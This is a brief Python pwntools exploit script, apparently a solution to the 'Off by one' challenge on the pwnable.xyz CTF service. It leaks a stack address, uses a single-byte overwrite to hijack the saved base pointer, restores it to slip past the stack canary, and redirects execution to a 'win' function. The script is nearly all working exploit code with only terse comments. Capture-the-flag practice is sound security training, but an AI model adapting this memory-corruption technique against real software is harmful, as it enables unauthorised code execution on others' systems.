###Off by one
from pwn import *

###Util
def show():
    r.sendlineafter('> ','3')
    return int(r.recvline()[2:-1],16)-0xf8

###Addr
win = 0xb77

###Exploit
r = remote('svc.pwnable.xyz',30012)
stack = show()

###Off by one to jijack rbp
r.sendafter('> ',str(win&0xff).ljust(0x20,'a').encode()+p8((stack&0xff)+9))

###Change rbp back so canary doesn't break and jump
r.sendafter('> ','1'.ljust(0x20,'a').encode()+p8(stack&0xff))
r.interactive()
